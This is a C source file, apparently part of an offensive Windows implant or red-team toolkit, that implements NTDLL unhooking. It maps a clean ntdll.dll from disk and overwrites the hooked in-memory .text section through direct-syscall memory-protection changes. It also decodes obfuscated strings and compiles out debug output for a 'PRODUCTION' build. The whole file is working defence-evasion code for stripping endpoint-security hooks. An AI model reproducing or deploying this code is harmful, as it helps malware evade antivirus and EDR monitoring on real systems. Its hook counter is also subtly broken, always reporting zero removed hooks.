/*
 * Author: 28zaakypro@proton.me
 * NTDLL unhooking — overwrites the hooked .text section with a clean copy from disk
 */

#include "unhooking.h"
#include "syscalls.h"
#include "evs.h"
#include "evs_strings.h"

PVOID LoadFreshNTDLL() {
    char ntdllFilename[sizeof(EVS_path_ntdll_sep) + 1];
    EVS_D(ntdllFilename, EVS_path_ntdll_sep);

    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, ntdllFilename);
    SecureZeroMemory(ntdllFilename, sizeof(ntdllFilename));

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    /* SEC_IMAGE: mapped as a proper PE image; section VAs match header offsets.
     * FindTextSection (VirtualAddress) works correctly on this view. */
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return NULL;

    PVOID freshNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    return freshNtdll;
}

// Locate .text section using VirtualAddress (for in-memory PE)
BOOL FindTextSection(PVOID moduleBase, PVOID* textStart, SIZE_T* textSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textStart = (BYTE*)moduleBase + section[i].VirtualAddress;
            *textSize  = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL RestoreTextSection(PVOID hookedNtdll, PVOID freshNtdll) {
    PVOID hookedText, freshText;
    SIZE_T hookedSize, freshSize;

    if (!FindTextSection(hookedNtdll, &hookedText, &hookedSize))    return FALSE;
    if (!FindTextSection(freshNtdll,  &freshText,  &freshSize))     return FALSE;

    SIZE_T restoreSize = (freshSize < hookedSize) ? freshSize : hookedSize;

    // Count modified bytes (hooks)
    DWORD diff = 0;
    for (SIZE_T i = 0; i < restoreSize; i++)
        if (((BYTE*)hookedText)[i] != ((BYTE*)freshText)[i]) diff++;

    #ifndef PRODUCTION
    printf("[*] Hooked bytes: %d — restoring %zu bytes\n", diff, restoreSize);
    #endif

    DWORD oldProtect;
    if (!SysVirtualProtect(hookedText, restoreSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(hookedText, freshText, restoreSize);

    DWORD tmp;
    SysVirtualProtect(hookedText, restoreSize, oldProtect, &tmp);
    FlushInstructionCache(GetCurrentProcess(), hookedText, restoreSize);

    #ifndef PRODUCTION
    printf("[+] .text section restored\n");
    #endif
    return TRUE;
}

BOOL UnhookNTDLL(UNHOOK_RESULT* result) {
    result->success       = FALSE;
    result->hooksFound    = 0;
    result->hooksRemoved  = 0;
    result->bytesRestored = 0;

    #ifndef PRODUCTION
    printf("[*] NTDLL unhooking...\n");
    #endif

    char ntdllName[sizeof(EVS_dll_ntdll) + 1];
    EVS_D(ntdllName, EVS_dll_ntdll);
    HMODULE hookedNtdll = GetModuleHandleA(ntdllName);
    SecureZeroMemory(ntdllName, sizeof(ntdllName));
    if (!hookedNtdll) return FALSE;

    PVOID freshNtdll = LoadFreshNTDLL();
    if (!freshNtdll) return FALSE;

    if (!RestoreTextSection(hookedNtdll, freshNtdll)) {
        UnmapViewOfFile(freshNtdll);
        return FALSE;
    }

    UnmapViewOfFile(freshNtdll);

    result->success      = TRUE;
    result->hooksRemoved = result->hooksFound;
    return TRUE;
}

void PrintUnhookResult(UNHOOK_RESULT* result) {
    #ifndef PRODUCTION
    if (result->success)
        printf("[+] Unhooking OK — hooks removed: %d\n", result->hooksRemoved);
    else
        printf("[-] Unhooking failed\n");
    #endif
}
